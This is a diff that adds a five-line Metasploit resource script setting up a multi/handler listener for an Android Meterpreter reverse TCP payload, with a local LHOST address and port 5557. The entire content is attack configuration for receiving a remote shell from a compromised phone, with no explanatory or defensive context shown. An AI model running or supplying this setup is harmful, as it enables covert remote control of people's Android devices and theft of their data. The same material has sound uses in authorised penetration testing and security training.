@@ -1,0 +1,5 @@
+use multi/handler
+set payload android/meterpreter/reverse_tcp
+set LPORT 5557
+set LHOST 192.168.0.103
+exploit
